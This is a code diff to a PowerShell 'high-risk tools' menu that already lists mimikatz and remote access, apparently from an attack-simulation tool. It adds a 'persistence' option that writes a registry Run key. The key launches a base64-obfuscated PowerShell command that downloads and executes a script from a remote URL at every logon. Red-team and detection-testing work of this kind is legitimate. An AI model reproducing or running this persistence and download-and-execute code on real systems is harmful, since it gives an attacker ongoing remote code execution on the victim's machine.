@@ -4428,6 +4428,7 @@ class HighRiskToolsAndCommands : CommandBase {
         Write-Host "High-Risk Tools and Commands"
         while ($true) {
             Write-Host "************************************"
+            Write-Host " 0) Establish persistence for corvette"
             Write-Host " 1) Remote Access"
             Write-Host " 2) Run mimikatz"
             Write-Host " 3) Run mimikatz (Run as administrator)"
@@ -4441,6 +4442,21 @@ class HighRiskToolsAndCommands : CommandBase {
                     switch ($cmd) {
                         "q" {
                             return
+                        }
+                        "0" {
+                            $path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+                            $name = "corvette"
+                            $ret = Get-ItemProperty $path -name $name -ErrorAction SilentlyContinue
+                            if ($null -ne $ret) {
+                                Write-Host "$name already exists in $path"
+                                if (AskYesNo "Do you want to remove it?") {
+                                    Remove-ItemProperty -Path $path -Name $name
+                                }
+                            } else {
+                                $reg = New-ItemProperty -Force -Path $path -Name $name `
+                                    -Value "powershell -e JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKABbAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoATgBlAHcAKAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAcABlAGEAcgBtAGkAbgAxADAALwBjAG8AcgB2AGUAdAB0AGUALwBiAGwAbwBiAC8AbQBhAGkAbgAvAGMAbwByAHYAZQB0AHQAZQAuAHAAcwAxAD8AcgBhAHcAPQB0AHIAdQBlACcAKQApACkA"
+                                Write-Host "Persistence was achieved to ensure that 'corvette' runs on system startup at $path"
+                            }
                         }
                         "1" {
                             [RemoteAccess]::New($this.props).Run()
